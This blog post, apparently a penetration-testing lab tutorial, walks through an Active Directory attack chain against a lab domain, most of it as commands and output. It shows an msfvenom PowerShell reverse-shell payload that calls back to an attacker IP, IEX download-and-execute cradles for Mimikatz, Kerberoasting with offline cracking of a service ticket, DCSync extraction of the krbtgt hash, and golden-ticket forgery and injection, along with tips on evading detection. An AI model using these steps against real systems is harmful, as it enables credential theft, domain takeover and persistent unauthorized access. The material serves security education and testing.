<p>For all of the attacks detailed here, I have a relatively simple setup in a lab. One (Server 2012) Domain Controller for the <em>foo.local</em> domain. Two client PCs joined to the domain running Windows 7 and Windows 10. Another IIS Web server running on Server 2012 Core also joined to the domain and Kali Linux &lsquo;attacker&rsquo; on the same subnet as all of these Windows computers.</p>
<p>One key piece of the puzzle I am leaving out is how the initial shell was obtained. This could have happened a variety of ways and will probably always be different with every engagement. Lets just assume that I have a meterpreter shell as a non privileged domain user on the Windows 10 client PC.</p>
<figure>
<img loading=lazy src=/images/kerberos_golden_ticket_initial_meterpreter.png>
</figure>
<p>One last bit of scene setting I think is important is to state the fact that we are going to try and be as quiet as possible now that we have the meterpreter shell up.</p>
<h1 id=spn-scanning---the-setup>spn scanning - the setup<a hidden class=anchor aria-hidden=true href=#spn-scanning---the-setup>#</a></h1>
<p>One of the avenues we can pursue now is to query Active Directory for objects that have a <a href=https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949%28v%3Dvs.85%29.aspx>Service Principal Name</a> set.</p>
<blockquote>
<p>A service principal name (SPN) is the name by which a client uniquely identifies an instance of a service. If you install multiple instances of a service on computers throughout a forest, each instance must have its own SPN.</p>
</blockquote>
<p>Basically, what this means is that someone went and configured a SPN for a service account that is used by multiple by instances of a service. Each of the client PC&rsquo;s in my lab are running an instance of <a href=https://www.microsoft.com/en/server-cloud/products/sql-server-editions/sql-server-express.aspx>SQL Server 2014 Express</a>, configured to run with the <code>svcSQLServ</code> domain service account.</p>
<blockquote>
<p>When a client wants to connect to a service, it locates an instance of the service, composes an SPN for that instance, connects to the service, and presents the SPN for the service to authenticate.</p>
</blockquote>
<p>On my domain controller, I configured the SPN&rsquo;s with the following commands:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>PS C:\&gt; setspn -A svcSQLServ/pc1.foo.local:1433 foo\svcSQLServ
Checking domain DC=foo,DC=local

Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
        svcSQLServ/pc1.foo.local:1433
Updated object

PS C:\&gt; setspn -A svcSQLServ/pc2.foo.local:1433 foo\svcSQLServ
Checking domain DC=foo,DC=local

Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
        svcSQLServ/pc2.foo.local:1433
Updated object
</code></pre></div><h2 id=spn-scanning---the-offensive-perspective>spn scanning - the offensive perspective<a hidden class=anchor aria-hidden=true href=#spn-scanning---the-offensive-perspective>#</a></h2>
<p>Right, with the configuration done, lets put on our offensive hats and try and abuse this. I think one thing that one should realize is that this is a very nice way to get a <em>free port scan</em> done too. You will see in a moment. =]</p>
<p>Reading some posts and stuff online, I have found a PowerShell module that will prep the LDAP lookup and scan for SPNs for you <a href=https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts>here</a>. The gist of it is this LDAP search <code>(&(objectcategory=user)(serviceprincipalname=*))</code>.</p>
<p>To use the powershell module, the easiest will be to get an interactive powershell session up and running. If you have ever tried this from meterpreter, you will know that if you try and spawn <code>powershell.exe</code> from a cmd shell, you will not get anywhere. Very frustrating. Its not impossible though! We are however going to go through the efforts of getting a working PowerShell session up as we will be using it extensively throughout this post.</p>
<h3 id=setup-a-powershell-connection>setup a powershell connection<a hidden class=anchor aria-hidden=true href=#setup-a-powershell-connection>#</a></h3>
<p>We can use the meterpreter session to get a powershell session. First, we will create a payload to execute as a script using the <code>exec_powershell</code> post module. In a new terminal, run <code>msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# msfvenom -p windows/powershell_reverse_tcp LHOST<span style=color:#f92672>=</span>192.168.138.150 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4445</span> -t raw
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: <span style=color:#ae81ff>1727</span> bytes
���<span style=color:#e6db74>`</span>��1�d�P0�R
�8�u�<span style=color:#f92672>}</span>�;<span style=color:#f92672>}</span>$u�X�X$�f�Y ӋI�:I�4��1����
                      K�XӋ�ЉD$$<span style=color:#f92672>[[</span>aYZQ��__Z���<span style=color:#f92672>]</span>j���Ph1�o��ջ���Vh������&lt;|
���u�GrojS��powershell.exe -exec bypass -nop -W hidden -noninteractive IEX <span style=color:#66d9ef>$(</span>$s<span style=color:#f92672>=</span>New-Object IO.MemoryStream<span style=color:#f92672>(</span>,<span style=color:#f92672>[</span>Convert<span style=color:#f92672>]</span>::FromBase64String<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;H4sIABX0kF ... snip ... AAA=&#39;</span><span style=color:#66d9ef>)</span><span style=color:#f92672>)</span>;IEX <span style=color:#f92672>(</span>New-Object IO.StreamReader<span style=color:#f92672>(</span>New-Object IO.Compression.GzipStream<span style=color:#f92672>(</span>$s,<span style=color:#f92672>[</span>IO.Compression.CompressionMode<span style=color:#f92672>]</span>::Decompress<span style=color:#f92672>)))</span>.ReadToEnd<span style=color:#f92672>()</span>;<span style=color:#f92672>)</span>
</code></pre></div><p>This will give you the raw payload you need to run to get a remote powershell shell. Copy the output from <code>IEX</code> all the way to <code>ReadToEnd();)</code> and paste that in a new file (I used <code>/root/power-shell.ps1</code>).</p>
<p>Now, back at your metasploit session, background the meterpreter session and setup a new <code>exploit/multi/handler</code> for the <code>windows/powershell_reverse_tcp</code> payload. When you issue the <code>exploit</code> command, add <code>-j</code> so that the job will run in the background as we have one more thing to do before it will connect back.</p>
<figure>
<img loading=lazy src=/images/kerberos_golden_ticket_powershell_handler.png>
</figure>
<p>Fantastic. We are ready to accept the powershell connection! The last thing left to do is to execute the script we generated earlier with <code>msfvenom</code>! Use the <code>exec_powershell</code> post module and configure it to pickup the script where ever you placed it on disk:</p>
<figure>
<img loading=lazy src=/images/kerberos_golden_ticket_exec_powershell.png>
</figure>
<p>With the module configured to use the meterpreter session we originally got, as well as our exploit handler waiting in the background for the powershell connection, we issue the <code>run</code> command and hope it works!</p>
<figure>
<img loading=lazy src=/images/kerberos_golden_ticket_powershell_shell.png>
</figure>
<blockquote>
<p>Powershell session session 3 opened</p>
</blockquote>
<p>Ok, that was a lot of work, but now we have the environment we need to get on with the SPN scanning! Simply interact with the session that spawned.</p>
<p>The next thing we want to do is get the <code>Find-PSServiceAccounts</code> PowerShell function into the environment. The script lives <a href=https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts>here</a>. Thankfully, we can kind of <em>include</em> functions into the current session by using the powershell <code>Invoke-Expression</code> cmdlet for a new <code>Net.WebClient</code> object. To do that we run:</p>
<pre tabindex=0><code>Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts')
</code></pre><p>Thats it. We can now just run the method!!</p>
<figure>
<img loading=lazy src=/images/kerberos_golden_ticket_find_psserviceaccounts.png>
</figure>
<p>We have just discovered the service account <code>svcSQLServ</code> and 2 hosts there it is in use!
The script also accepts a few arguments, such as <code>-DumpSPN</code>:</p>
<pre tabindex=0><code>PS C:\&gt; Find-PSServiceAccounts -DumpSPN
Discovering service account SPNs in the AD Domain foo.local
svcSQLServ/pc1.foo.local:1433
svcSQLServ/pc2.foo.local:1433
PS C:\Users\bobs\Downloads&gt;
</code></pre><p>This is the part where I remind you about the <em>free port scan</em> I mentioned earlier. Notice how we have discovered services, ports and accounts running them using just a LDAP query. I highly doubt that will trigger many monitoring tools out there!</p>
<h2 id=kerberos-service-tickets>kerberos service tickets<a hidden class=anchor aria-hidden=true href=#kerberos-service-tickets>#</a></h2>
<p>We now have 2 SPN&rsquo;s that we managed to query off the domain. <code>svcSQLServ/pc1.foo.local:1433</code> & <code>svcSQLServ/pc2.foo.local:1433</code>. In order for clients to be able to authenticate to the services running as this user via kerberos, they would typically go through the process of requesting a service ticket.</p>
<p><em>This is where you need to pay attention.</em> The service ticket is encrypted using the secret key (<em>read, &lsquo;password&rsquo;</em>) of the account used in the SPN (<code>svcSQLServ</code> in this case)! The server never checks if the ticket ever went through the entire process of actually being used, it just happily generates them for whoever asks&mldr; Note, the server hosting the service will still validate the ticket itself (99% of the time without rechecking the ticket with the Kerberos server).</p>
<p>What does that mean for an attacker? Well, we can request the service ticket&mldr; and&mldr; attempt to decrypt it by brute forcing it offline! If the decryption is successful, then we have successfully compromised a service account.</p>
<h2 id=enter-kerberoast>enter kerberoast<a hidden class=anchor aria-hidden=true href=#enter-kerberoast>#</a></h2>
<p><a href=https://github.com/nidem/kerberoast>Kerberoast</a> is a tool that can amongst other things, crack Kerberos ticket passwords. The general idea is that we get the SPN&rsquo;s (like we did), request kerberos service tickets for them, dump the ticket out of memory and send it to the <code>tgsrepcrack.py</code> script to crack against a wordlist.</p>
<p>All of this can be done as a normal domain user and does not require any elevated privileges. To assist us in dumping kerberos tickets out of memory, we are going to load mimikatz by using <code>Invoke-Mimikatz</code> (from the <a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1>PowerSploit Repository</a>). This method has a very small to no chance of getting detected by AV atm. Lets get that loaded:</p>
<pre tabindex=0><code>PS C:\&gt; Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
PS C:\&gt; Invoke-Mimikatz

  .#####.   mimikatz 2.0 alpha (x64) release &quot;Kiwi en C&quot; (Dec 14 2015 19:16:34)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 17 modules * * */


mimikatz(powershell) # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz(powershell) # exit
Bye!
</code></pre><p>Just running <code>Invoke-Mimikatz</code> might not be entirely opsec safe as, by default, it will run the <code>sekurlsa::logonpasswords</code> command (which may trigger some monitoring). You may have also noticed the <code>LOAD_MODULES</code> setting in the <code>windows/powershell_reverse_tcp</code> payload. Here we can actually give it the URL&rsquo;s we are going to load with <code>Invoke-Expression</code> and metasploit will download and prep that for you! :)</p>
<p>Anyways, lets check the current cached kerberos tickets that we have for this session.</p>
<pre tabindex=0><code>PS C:\&gt; Invoke-Mimikatz -Command '&quot;kerberos::list&quot;'

  .#####.   mimikatz 2.0 alpha (x64) release &quot;Kiwi en C&quot; (Dec 14 2015 19:16:34)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 17 modules * * */


mimikatz(powershell) # kerberos::list

PS C:\&gt;
</code></pre><p>Looks like there are no cached Kerberos tickets for this session. This can also be checked by running the <code>klist</code> command:</p>
<pre tabindex=0><code>PS C:\&gt; klist

Current LogonId is 0:0x3fde2

Cached Tickets: (0)
PS C:\&gt;
</code></pre><p>If you had tickets here, you can purge them from memory by running <code>Invoke-Mimikatz -Command '"kerberos::purge"'</code>.
Lets request a service ticket for the <code>svcSQLServ/pc1.foo.local:1433</code> SPN (The command syntax can be seen in the Kerberoast repository):</p>
<pre tabindex=0><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel
PS C:\&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;svcSQLServ/pc1.foo.local:1433&quot;


Id                   : uuid-33208c1c-6f30-441f-af50-94ba72a2ed7b-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 1/9/2016 7:29:11 PM
ValidTo              : 1/10/2016 5:29:11 AM
ServicePrincipalName : svcSQLServ/pc1.foo.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey



PS C:\&gt;
</code></pre><p>If you wanted to get tickets for all of the possible SPN&rsquo;s, we could have run the below command that will loop over the results from <code>Find-PSServiceAccounts</code> and request a ticket for each:</p>
<pre tabindex=0><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel
PS C:\&gt; Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object System.Identity Model.Tokens.KerberosRequestorSecurityToken -ArgumentList $_ }

</code></pre><p>Now, if we recheck the tickets we have for this session, we can see that we have one for <code>svcSQLServ</code>:</p>
<figure>
<img loading=lazy src=/images/kerberos_golden_ticket_spn.png>
</figure>
<h2 id=dumping-kerberos-tickets-from-memory>dumping kerberos tickets from memory<a hidden class=anchor aria-hidden=true href=#dumping-kerberos-tickets-from-memory>#</a></h2>
<p>Remember, all of the actions performed thus far have been as a normal AD user with no special privileges. With the tickets now in memory, we can dump them to a file using mimikatz again. The mimikatz command we will use for this is <code>kerberos::list /export</code>:</p>
<figure>
<img loading=lazy src=/images/kerberos_golden_ticket_exported_tickets.png>
</figure>
<p><code>1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi</code> is the Kerberos ticket dumped to disk! We can now transfer this to some place where we have Kerberoast downloaded and start cracking it! :D</p>
<h2 id=cracking-the-kerberos-ticket>cracking the kerberos ticket<a hidden class=anchor aria-hidden=true href=#cracking-the-kerberos-ticket>#</a></h2>
<p>Back at my meterpreter session, we can simply download the ticket locally, and start the crack. <code>tgsrepcrack.py</code> allows you to specify tickets with a wildcard, so it will run the wordlist recursively over all of the tickets in a directory.</p>
<p>So download the ticket&mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>meterpreter &gt; cd downloads/kerb
meterpreter &gt; ls
Listing: C:\users\bobs\downloads\kerb
=====================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1260  fil   2016-01-09 14:35:09 -0500  0-40e10000-bobs@krbtgt~FOO.LOCAL-FOO.LOCAL.kirbi
100666/rw-rw-rw-  1364  fil   2016-01-09 14:35:09 -0500  1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi

meterpreter &gt; download 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi /root/
[*] downloading: 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -&gt; /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
[*] download   : 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -&gt; /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
</code></pre></div><p>&mldr; and crack it!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>root@kali:~/kerberoast# python tgsrepcrack.py /usr/share/wordlists/fasttrack.txt /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
found password for ticket 0: Password1  File: /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
All tickets cracked!
</code></pre></div><p><code>Password1</code> is the password for the <code>svcSQLServ</code> account! \o/</p>
<p>One reason why having the password for this account is especially bad is because of its group memberships&mldr; Yes, I know. You may not easily see this in real life, but just bear with me for now.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>PS C:\&gt; net user svcSQLServ /domain
The request will be processed at a domain controller for domain foo.local.

User name                    svcSQLServ
Full Name                    SQL Server
Comment                      SQL Server Serice Account
User&#39;s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/7/2016 11:38:02 PM
Password expires             Never
Password changeable          1/8/2016 11:38:02 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/9/2016 10:33:41 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.

PS C:\&gt;
</code></pre></div><h2 id=testing-the-credentials>testing the credentials<a hidden class=anchor aria-hidden=true href=#testing-the-credentials>#</a></h2>
<p>For a bit of fun, lets test the credentials we just got using PowerShell Remoting. PowerShell Remoting is on by default on Server 2012 I believe.</p>
<p>We will start by configuring a credentials object, and then just run the <code>Get-Process</code> cmdlet on the domain controller as proof.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>$pass = &#39;Password1&#39; | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList &#39;svcSQLServ&#39;, $pass
Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds
</code></pre></div><p>With output&mldr;</p>
<figure>
<img loading=lazy src=/images/kerberos_golden_ticket_svcsqlserv_remoting.png>
</figure>
<p>So, we popped a service account with waaaay too much permissions and a crappy password. All that as a normal AD user&mldr;</p>
<h1 id=golden-tickets>golden tickets<a hidden class=anchor aria-hidden=true href=#golden-tickets>#</a></h1>
<p>We have domain administrative rights now. There is nothing left to do, we can write the pentest report and go home. Or can we? Well yes, but what if the password to <code>svcSQLServ</code> changes? That would mean we lose access! One way we can prevent this is by creating a <em>golden ticket</em> that we can re-use to grant ourselves whatever permission we like, as any user we like! Sounds great eh :D</p>
<p>To create a golden ticket, we can use either the <em>kiwi</em> extension in metasploit, or <code>Invoke-Mimikatz</code> again! There are however a few prerequisites that we need to satisfy for golden tickets. The most important being that we need at least the NT hash of the <code>krbtgt</code> user of the domain. Without that, this is not a viable persistence strategy.</p>
<p>The complete list of prerequisites are:</p>
<ul>
<li>The Domains FQDN</li>
<li>The Domains SID</li>
<li>The <code>krbtgt</code> accounts NT hash</li>
<li>A username (fake or real, does not matter. Not fake if you need opsec ofc!)</li>
</ul>
<p>Getting the FQDN and SID (<code>whoami /user</code>) of the Domain should be relatively trivial. Remember to grab the SID without the <a href=https://en.wikipedia.org/wiki/Security_Identifier>trailing RID</a>. So if the full SID is <code>S-1-5-21-2222611480-1876485831-1594900117-1104</code> then you are only going to use <code>S-1-5-21-2222611480-1876485831-1594900117</code>.</p>
<p>Getting the NT Hash of the <code>krbtgt</code> account though is something I want to show using a recent feature addition to mimikatz, <a href=http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/>DCSync</a>. The gist of it is that its possible to extract hashes from a Domain Controller (using a domain admin type account), without actually running any code on the Domain Controller itself! This is of course not the only way to get the required hash. Many of the older techniques work just fine. But, from a DCSync perspective, it essentially means hash extraction from any PC on the domain (authenticated as a admin), by ‘faking’ being a Domain Controller and triggering some replication-fu! In my case, I struggled a little to get this replication done from a client PC in the lab via the metasploit interactive PowerShell session, but could do it successfully from a client PC via the console. So, its definitely possible!</p>
<p>In this case, to use the DCSync feature of mimikatz, I am going to use PowerShell Remoting to run commands. Unfortunately, due to the way <code>Enter-PSSession</code> sets up the shell, I can&rsquo;t seem to get an interactive shell as another user going without using another exploit && payload combination. So, we are just going to use <code>Invoke-Command</code> with our commands.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>PS C:\&gt; $creds

UserName                       Password
--------                       --------
svcSQLServ System.Security.SecureString


PS C:\&gt; Invoke-Command -ScriptBlock {Write-Output $env:username} -Credential $creds -ComputerName dc1
svcSQLServ
</code></pre></div><p>Great so that works. To continue, we are going to have to run a few commands:</p>
<ul>
<li><code>Invoke-Expression</code> to get mimikatz</li>
<li>Run <code>Invoke-Mimikatz</code> with <code>lsadump::dcsync /user:krbtgt</code> and its required parameters</li>
<li>Dance!</li>
</ul>
<p>I constructed my command that needed to be run on my PowerShell session and ended up with this:</p>
<pre tabindex=0><code>Invoke-Command -ScriptBlock {Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '&quot;lsadump::dcsync /user:krbtgt&quot;'} -Credential $creds -ComputerName dc1
</code></pre><p>Let me try explain what is going on here. I am saying, <code>Invoke-Command</code> on the computer <code>dc1</code> as <code>svcSQLServ</code> (stored in the <code>$creds</code> variable) using PowerShell Remoting. The command to run is defined in the <code>ScriptBlock {}</code> which is i) download mimikatz ii) run <code>Invoke-Mimikatz</code> with the <code>lsadump::dcsync /user:krbtgt</code> command.</p>
<figure>
<img loading=lazy src=/images/kerberos_golden_ticket_krbtgt.png>
</figure>
<p>We have the hash for <code>krbtgt</code>! <code>95a11f7d93fa3a5a61073662e6bd8468</code> : D That means I have everything I need to create a golden ticket, with all the access in the world! To summarize, my prerequisites are satisfied with the following values:</p>
<ul>
<li>The Domains FQDN. <code>foo.local</code></li>
<li>The Domains SID. <code>S-1-5-21-2222611480-1876485831-1594900117</code></li>
<li>The <code>krbtgt</code> accounts NT hash. <code>95a11f7d93fa3a5a61073662e6bd8468</code></li>
<li>A username (fake or real, does not matter. Not fake if you need opsec ofc!). <code>darthvader</code></li>
</ul>
<h2 id=creating-the-golden-ticket>creating the golden ticket<a hidden class=anchor aria-hidden=true href=#creating-the-golden-ticket>#</a></h2>
<p>Creating the golden ticket is now a really simple task. We will simply call <code>Invoke-Mimikatz</code> again to generate the ticket. It will be saved to disk when it is generated. Thereafter, we will purge all the tickets we have for the session, and inject the golden ticket and test our access!</p>
<p>For details about the command and arguments required, I referred to the <a href=https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver>mimikatz wiki</a> and replicated that. Our command should look something like the below, saving our golden ticket to <code>golden.tck</code> with access to a few builtin Windows Groups:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>kerberos::golden /user:darthvader /domain:foo.local /sid:S-1-5-21-2222611480-1876485831-1594900117 /krbtgt:95a11f7d93fa3a5a61073662e6bd8468 /ticket:golden.tck /groups:501,502,513,512,520,518,519
</code></pre></div><p>Running this mimikatz command with <code>Invoke-Mimikatz</code> gets us our Golden Ticket:</p>
<figure>
<img loading=lazy src=/images/kerberos_golden_ticket_created.png>
</figure>
<h2 id=injecting-the-golden-ticket>injecting the golden ticket<a hidden class=anchor aria-hidden=true href=#injecting-the-golden-ticket>#</a></h2>
<p>The final test is to <em>use</em> this ticket. For that, we will purge all Kerberos tickets in memory and inject the new golden ticket. Thereafter we will test if we can read the administrative <code>c$</code> share of the Domain Controller!</p>
<p>Lets purge the currently cached Kerberos tickets first:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>PS C:\users\bobs\downloads\golden&gt; Invoke-Mimikatz -Command &#39;&#34;kerberos::purge&#34;&#39;

[... snip ...]

mimikatz(powershell) # kerberos::purge
Ticket(s) purge for current session is OK
</code></pre></div><p>Next, we inject the golden ticket we created using the mimikatz <code>kerberos::ptt</code> command to <em>&lsquo;Pass The Ticket&rsquo;</em>:</p>
<figure>
<img loading=lazy src=/images/kerberos_golden_ticket_ptt.png>
</figure>
<p>After the ticket is injected into memory, we can verify its existence with the mimikaz <code>kerberos::list</code> command, or just using <code>klist</code>. Once it is injected, we <code>dir</code> the Domain Controllers <code>c$</code> share&mldr; an <em>smile</em>. The password for <code>scvSQLServ</code> can now change, it will no longer bother us!</p>
<figure>
<img loading=lazy src=/images/kerberos_golden_ticket_admin.png>
</figure>
<h2 id=conclusion>conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2>
<p>In this post we saw how it is possible to &lsquo;crack&rsquo; badly passworded and configured service accounts by querying for accounts by Service Principal Names. Those SPN&rsquo;s were then used to request Service Tickets from the Domain Controller, extracted from memory and cracked offline. All of that as a normal domain user.</p>
<p>Then, we explored how it is possible to extract Domain Account hashes using the mimikatz <em>DCSync</em> feature and generate a Kerberos Golden Ticket with high access levels in the domain.</p>
<p>I think there is still a loooong road ahead for the Microsoft Kerberos Implementations&mldr; Until they &lsquo;fix&rsquo; this stuff, things should remain interesting for quite some time to come.</p>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2016/06/16/rooting-darknet/>
<span class=title>« Prev Page</span>
<br>
<span>rooting darknet</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2015/09/30/a-totally-unnecessary-composer-shell/>
<span class=title>Next Page »</span>
<br>
<span>a totally unnecessary composer shell</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share kerberos, kerberoast and golden tickets on twitter" href="https://twitter.com/intent/tweet/?text=kerberos%2c%20kerberoast%20and%20golden%20tickets&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share kerberos, kerberoast and golden tickets on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets&summary=kerberos%2c%20kerberoast%20and%20golden%20tickets&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share kerberos, kerberoast and golden tickets on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 